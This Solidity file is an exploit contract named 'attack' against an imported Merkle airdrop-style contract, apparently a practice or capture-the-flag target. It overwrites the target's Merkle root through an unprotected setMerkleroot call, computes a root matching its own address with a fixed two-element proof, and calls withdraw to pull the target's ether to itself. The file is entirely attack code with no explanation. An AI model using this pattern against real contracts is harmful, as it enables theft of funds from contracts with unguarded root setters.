// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.7.0;
import "./Merkle.sol";
contract attack{
    Merkle merk;
    
    constructor(){
        
    }
    function init(address _addr)public{
        merk = Merkle(_addr);
    }
    function att(bytes32 root)public payable{
        bytes32[] memory proof = new bytes32[](2);
        // [0x0011223344556677889900112233445566778899001122334455667788990011,0x0011223344556677889900112233445566778899001122334455667788990022];
        proof[0]=0x0011223344556677889900112233445566778899001122334455667788990011;
        proof[1]=0x0011223344556677889900112233445566778899001122334455667788990022;
        merk.setMerkleroot(root);
    }
    function att2()public {
        bytes32[] memory proof = new bytes32[](2);
        // [0x0011223344556677889900112233445566778899001122334455667788990011,0x0011223344556677889900112233445566778899001122334455667788990022];
        proof[0]=0x0011223344556677889900112233445566778899001122334455667788990011;
        proof[1]=0x0011223344556677889900112233445566778899001122334455667788990022;
        merk.withdraw(proof,address(this));
    }
    function figure()public returns(bytes32){
        bytes32[] memory proof = new bytes32[](2);
        // [0x0011223344556677889900112233445566778899001122334455667788990011,0x0011223344556677889900112233445566778899001122334455667788990022];
        proof[0]=0x0011223344556677889900112233445566778899001122334455667788990011;
        proof[1]=0x0011223344556677889900112233445566778899001122334455667788990022;
        bytes32 computedHash = keccak256(abi.encodePacked(address(this)));
        // bytes32 computedHash = msg.sender;
        for (uint256 i = 0; i < proof.length; i++) {
            bytes32 proofElement = proof[i];
            if (computedHash <= proofElement) {
                // Hash(current computed hash + current element of the proof)
                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
            } else {
                // Hash(current element of the proof + current computed hash)
                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
            }
        }
        return computedHash;
    }
    fallback()external payable{
        
    }
}
// contract figure{
//     bytes20 public mask;
//     constructor(){
//         mask = hex"ff00000000000000000000000000000000000000";
//     }
// }
